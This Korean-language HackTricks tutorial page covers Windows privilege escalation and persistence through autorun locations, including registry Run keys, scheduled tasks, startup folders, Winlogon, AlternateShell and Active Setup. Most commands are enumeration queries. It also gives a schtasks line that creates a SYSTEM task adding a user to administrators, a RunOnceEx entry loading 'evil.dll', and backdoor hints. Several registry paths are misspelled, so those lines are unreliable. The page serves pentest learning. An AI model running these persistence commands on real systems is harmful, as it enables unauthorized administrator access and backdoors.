# Autoruns를 통한 권한 상승

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**버그 바운티 팁**: **해커를 위해 해커가 만든 프리미엄 버그 바운티 플랫폼인** **Intigriti**에 **가입하세요**! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 저희와 함께하고 최대 **$100,000**의 보상을 받기 시작하세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

## WMIC

**Wmic**는 **시작 시** 프로그램을 실행하는 데 사용할 수 있습니다. 시작 시 실행되도록 프로그래밍된 바이너리를 확인하려면:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Scheduled Tasks

**작업**은 **특정 빈도**로 실행되도록 예약할 수 있습니다. 실행되도록 예약된 바이너리를 보려면:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Folders

모든 **시작 폴더에 위치한 바이너리들은 시작 시 실행됩니다**. 일반적인 시작 폴더는 다음에 나열된 폴더들이지만, 시작 폴더는 레지스트리에 표시됩니다. [여기를 읽어 어디에 있는지 알아보세요.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## 레지스트리

{% hint style="info" %}
[여기에서 참고](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): **Wow6432Node** 레지스트리 항목은 64비트 Windows 버전을 실행하고 있음을 나타냅니다. 운영 체제는 이 키를 사용하여 64비트 Windows 버전에서 실행되는 32비트 응용 프로그램에 대한 HKEY\_LOCAL\_MACHINE\SOFTWARE의 별도 보기를 표시합니다.
{% endhint %}

### 실행

**일반적으로 알려진** AutoRun 레지스트리:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

**Run** 및 **RunOnce**로 알려진 레지스트리 키는 사용자가 시스템에 로그인할 때마다 프로그램을 자동으로 실행하도록 설계되었습니다. 키의 데이터 값으로 할당된 명령줄은 260자 이하로 제한됩니다.

**서비스 실행** (부팅 중 서비스의 자동 시작을 제어할 수 있음):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Windows Vista 및 이후 버전에서는 **Run** 및 **RunOnce** 레지스트리 키가 자동으로 생성되지 않습니다. 이러한 키의 항목은 프로그램을 직접 시작하거나 종속성으로 지정할 수 있습니다. 예를 들어, 로그인 시 DLL 파일을 로드하려면 **RunOnceEx** 레지스트리 키와 "Depend" 키를 함께 사용할 수 있습니다. 이는 시스템 시작 시 "C:\temp\evil.dll"을 실행하는 레지스트리 항목을 추가하여 보여줍니다:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
{% hint style="info" %}
**Exploit 1**: **HKLM** 내의 언급된 레지스트리 중 어느 곳에든 쓸 수 있다면, 다른 사용자가 로그인할 때 권한을 상승시킬 수 있습니다.
{% endhint %}

{% hint style="info" %}
**Exploit 2**: **HKLM** 내의 레지스트리 중 어느 곳에든 표시된 이진 파일을 덮어쓸 수 있다면, 다른 사용자가 로그인할 때 해당 이진 파일을 백도어로 수정하고 권한을 상승시킬 수 있습니다.
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

**시작** 폴더에 배치된 바로 가기는 사용자 로그온 또는 시스템 재부팅 중에 서비스나 애플리케이션을 자동으로 시작합니다. **시작** 폴더의 위치는 **로컬 머신** 및 **현재 사용자** 범위에 대해 레지스트리에서 정의됩니다. 이는 이러한 지정된 **시작** 위치에 추가된 모든 바로 가기가 로그온 또는 재부팅 프로세스 후에 연결된 서비스나 프로그램이 시작되도록 보장하며, 프로그램을 자동으로 실행하도록 예약하는 간단한 방법이 됩니다.

{% hint style="info" %}
**HKLM** 아래의 \[User] Shell Folder를 덮어쓸 수 있다면, 이를 당신이 제어하는 폴더로 지정하고 사용자가 시스템에 로그인할 때마다 실행되는 백도어를 배치할 수 있습니다.
{% endhint %}
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon 키

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

일반적으로 **Userinit** 키는 **userinit.exe**로 설정됩니다. 그러나 이 키가 수정되면, 지정된 실행 파일이 사용자 로그온 시 **Winlogon**에 의해 실행됩니다. 마찬가지로, **Shell** 키는 Windows의 기본 셸인 **explorer.exe**를 가리키도록 되어 있습니다.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
레지스트리 값을 덮어쓰거나 바이너리를 덮어쓸 수 있다면 권한을 상승시킬 수 있습니다.
{% endhint %}

### 정책 설정

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

**실행** 키를 확인하십시오.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### 안전 모드 명령 프롬프트 변경

Windows 레지스트리의 `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` 아래에 기본적으로 `cmd.exe`로 설정된 **`AlternateShell`** 값이 있습니다. 이는 시작 시 "명령 프롬프트가 있는 안전 모드"를 선택할 때(F8 키를 눌러서) `cmd.exe`가 사용된다는 것을 의미합니다. 그러나 F8을 눌러 수동으로 선택하지 않고도 이 모드에서 자동으로 시작하도록 컴퓨터를 설정할 수 있습니다.

"명령 프롬프트가 있는 안전 모드"에서 자동으로 시작하는 부팅 옵션을 만들기 위한 단계:

1. `boot.ini` 파일의 속성을 변경하여 읽기 전용, 시스템 및 숨김 플래그를 제거합니다: `attrib c:\boot.ini -r -s -h`
2. 편집을 위해 `boot.ini`를 엽니다.
3. 다음과 같은 줄을 삽입합니다: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. `boot.ini`에 대한 변경 사항을 저장합니다.
5. 원래 파일 속성을 다시 적용합니다: `attrib c:\boot.ini +r +s +h`

* **Exploit 1:** **AlternateShell** 레지스트리 키를 변경하면 사용자 정의 명령 셸 설정이 가능해져, 무단 접근이 발생할 수 있습니다.
* **Exploit 2 (PATH 쓰기 권한):** 시스템 **PATH** 변수의 어떤 부분에든 쓰기 권한이 있는 경우, 특히 `C:\Windows\system32` 이전에, 사용자 정의 `cmd.exe`를 실행할 수 있으며, 이는 시스템이 안전 모드에서 시작될 경우 백도어가 될 수 있습니다.
* **Exploit 3 (PATH 및 boot.ini 쓰기 권한):** `boot.ini`에 대한 쓰기 접근은 자동 안전 모드 시작을 가능하게 하여, 다음 재부팅 시 무단 접근을 용이하게 합니다.

현재 **AlternateShell** 설정을 확인하려면 다음 명령을 사용하십시오:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installed Component

Active Setup은 **바탕 화면 환경이 완전히 로드되기 전에 시작되는** Windows의 기능입니다. 이는 특정 명령의 실행을 우선시하며, 사용자 로그온이 진행되기 전에 완료되어야 합니다. 이 과정은 Run 또는 RunOnce 레지스트리 섹션의 다른 시작 항목이 트리거되기 전에도 발생합니다.

Active Setup은 다음 레지스트리 키를 통해 관리됩니다:

* `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
* `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
* `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

이 키들 내에는 각 특정 구성 요소에 해당하는 다양한 하위 키가 존재합니다. 특히 관심 있는 키 값은 다음과 같습니다:

* **IsInstalled:**
* `0`은 구성 요소의 명령이 실행되지 않음을 나타냅니다.
* `1`은 명령이 각 사용자에 대해 한 번 실행됨을 의미하며, 이는 `IsInstalled` 값이 없을 경우의 기본 동작입니다.
* **StubPath:** Active Setup에 의해 실행될 명령을 정의합니다. `notepad`를 실행하는 것과 같은 유효한 명령줄일 수 있습니다.

**Security Insights:**

* **`IsInstalled`**가 `"1"`로 설정된 키를 특정 **`StubPath`**로 수정하거나 쓰는 것은 무단 명령 실행으로 이어질 수 있으며, 이는 권한 상승을 초래할 수 있습니다.
* 어떤 **`StubPath`** 값에서 참조된 이진 파일을 변경하는 것도 충분한 권한이 주어지면 권한 상승을 달성할 수 있습니다.

Active Setup 구성 요소 전반에 걸쳐 **`StubPath`** 구성을 검사하기 위해 다음 명령을 사용할 수 있습니다:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Overview of Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs)는 Microsoft의 Internet Explorer에 추가 기능을 제공하는 DLL 모듈입니다. 이들은 각 시작 시 Internet Explorer와 Windows Explorer에 로드됩니다. 그러나 **NoExplorer** 키를 1로 설정하면 실행이 차단되어 Windows Explorer 인스턴스와 함께 로드되지 않도록 할 수 있습니다.

BHOs는 Internet Explorer 11을 통해 Windows 10과 호환되지만, 최신 버전의 Windows에서 기본 브라우저인 Microsoft Edge에서는 지원되지 않습니다.

시스템에 등록된 BHOs를 탐색하려면 다음 레지스트리 키를 검사할 수 있습니다:

* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

각 BHO는 레지스트리에서 고유 식별자로서 **CLSID**로 표시됩니다. 각 CLSID에 대한 자세한 정보는 `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` 아래에서 찾을 수 있습니다.

레지스트리에서 BHOs를 쿼리하기 위해 다음 명령을 사용할 수 있습니다:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

레지스트리에는 각 dll마다 1개의 새로운 레지스트리가 포함되며, 이는 **CLSID**로 표시됩니다. CLSID 정보는 `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`에서 찾을 수 있습니다.

### Font Drivers

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Open Command

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### 이미지 파일 실행 옵션
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

모든 autoruns를 찾을 수 있는 사이트는 **이미**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)로 검색되었습니다. 그러나 **자동 실행되는** 파일의 **더 포괄적인 목록**을 원한다면 Sysinternals의 [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)를 사용할 수 있습니다:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## More

**레지스트리와 같은 더 많은 Autoruns를 찾으려면** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)

## References

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
* [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**버그 바운티 팁**: **해커를 위해 해커가 만든 프리미엄** **버그 바운티 플랫폼인** **Intigriti에 가입하세요**! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 저희와 함께하고 최대 **$100,000**의 보상을 받기 시작하세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>
{% endhint %}
